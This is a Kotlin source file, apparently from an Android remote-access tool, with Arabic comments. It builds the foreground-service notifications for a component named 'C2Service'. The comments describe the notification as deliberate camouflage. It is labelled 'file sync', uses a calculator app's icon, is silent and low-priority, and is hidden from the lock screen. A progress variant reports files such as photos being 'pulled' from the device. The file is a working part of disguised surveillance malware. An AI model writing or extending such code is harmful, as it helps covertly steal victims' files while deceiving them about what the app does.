package com.example.disguise.util

import android.app.Notification
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.os.Build
import androidx.core.app.NotificationCompat
import com.example.disguise.MainActivity
import com.example.disguise.R

/**
 * Notifier — ينشئ إشعار الخدمة الأمامية (Foreground Service Notification).
 *
 * لماذا هذا الملف؟
 * - C2Service يحتاج إشعاراً دائماً ليُعتبر Foreground Service.
 * - الإشعار يجب أن يبدو طبيعياً (تمويه): "مزامنة الملفات جارية".
 * - Android 8+ يتطلب قناة إشعارات (Channel) — ننشئها في C2Service،
 *   لكن هذا الملف يبني الإشعار نفسه.
 *
 * التمويه:
 * - العنوان: "مزامنة الملفات"
 * - النص: "جارٍ مزامنة ملفاتك في الخلفية"
 * - الأيقونة: أيقونة التطبيق (آلة حاسبة)
 * - الضغط: يفتح MainActivity (واجهة الآلة الحاسبة)
 *
 * ملاحظات Android 13+:
 * - POST_NOTIFICATIONS إذن مطلوب لعرض الإشعار.
 * - إذا لم يُمنح، الإشعار لن يظهر لكن الخدمة تعمل.
 * - MainActivity يجب أن تطلب الإذن عند التشغيل.
 *
 * ملاحظات Android 14+:
 * - يجب التصريح بـ foregroundServiceType في Manifest (dataSync).
 * - الإشعار يظهر إجبارياً (لا يمكن إخفاؤه).
 */
object Notifier {

    companion object {
        // معرف الإشعار (ثابت، حتى نتمكن من تحديثه أو إلغائه)
        const val NOTIFICATION_ID = 1001

        // معرف القناة (يجب أن يطابق ما في C2Service)
        const val CHANNEL_ID = "sync_channel"
    }

    /**
     * بناء الإشعار المموّه.
     *
     * @param context السياق (عادةً C2Service)
     * @param channelId معرف القناة (افتراضي: CHANNEL_ID)
     * @return Notification جاهز للاستخدام مع startForeground()
     */
    fun buildNotification(
        context: Context,
        channelId: String = CHANNEL_ID
    ): Notification {

        // Intent لفتح MainActivity عند الضغط على الإشعار
        val contentIntent = Intent(context, MainActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_SINGLE_TOP or Intent.FLAG_ACTIVITY_CLEAR_TOP
        }

        val pendingFlags = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        } else {
            PendingIntent.FLAG_UPDATE_CURRENT
        }

        val pendingIntent = PendingIntent.getActivity(
            context,
            0,
            contentIntent,
            pendingFlags
        )

        // بناء الإشعار
        val builder = NotificationCompat.Builder(context, channelId)
            .setContentTitle(context.getString(R.string.notif_title))
            .setContentText(context.getString(R.string.notif_text))
            .setSmallIcon(R.drawable.ic_sync)          // أيقونة صغيرة (يجب أن تكون موجودة)
            .setContentIntent(pendingIntent)
            .setOngoing(true)                            // لا يمكن إزالته بالسحب
            .setSilent(true)                             // بدون صوت
            .setPriority(NotificationCompat.PRIORITY_LOW) // أولوية منخفضة (لا يزعج)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET) // لا يظهر على شاشة القفل
            .setShowWhen(false)                          // لا يعرض الوقت

        // Android 14+ (API 34): يجب تحديد نوع الخدمة في الإشعار
        // (لكن هذا يتم عبر foregroundServiceType في Manifest، وليس هنا)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            builder.setForegroundServiceBehavior(
                NotificationCompat.FOREGROUND_SERVICE_IMMEDIATE
            )
        }

        return builder.build()
    }

    /**
     * إشعار تحديث التقدم (اختياري).
     * مفيد عند سحب ملف كبير: "جارٍ سحب IMG_1234.jpg (45%)".
     *
     * @param progress النسبة 0-100
     * @param fileName اسم الملف الحالي
     */
    fun buildProgressNotification(
        context: Context,
        progress: Int,
        fileName: String,
        channelId: String = CHANNEL_ID
    ): Notification {
        val contentIntent = Intent(context, MainActivity::class.java)
        val pendingFlags = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        } else {
            PendingIntent.FLAG_UPDATE_CURRENT
        }
        val pendingIntent = PendingIntent.getActivity(context, 0, contentIntent, pendingFlags)

        return NotificationCompat.Builder(context, channelId)
            .setContentTitle(context.getString(R.string.notif_title))
            .setContentText("جارٍ سحب: $fileName ($progress%)")
            .setSmallIcon(R.drawable.ic_sync)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .setSilent(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setProgress(100, progress, false)
            .build()
    }

    /**
     * إشعار بسيط (غير Foreground) للرسائل العابرة.
     * مثلاً: "تم سحب الملف بنجاح".
     *
     * @param title العنوان
     * @param text النص
     */
    fun showSimple(context: Context, title: String, text: String) {
        val manager = context.getSystemService(Context.NOTIFICATION_SERVICE)
                as android.app.NotificationManager
        val notification = NotificationCompat.Builder(context, CHANNEL_ID)
            .setContentTitle(title)
            .setContentText(text)
            .setSmallIcon(R.drawable.ic_sync)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setAutoCancel(true)
            .build()
        manager.notify(System.currentTimeMillis().toInt(), notification)
    }
}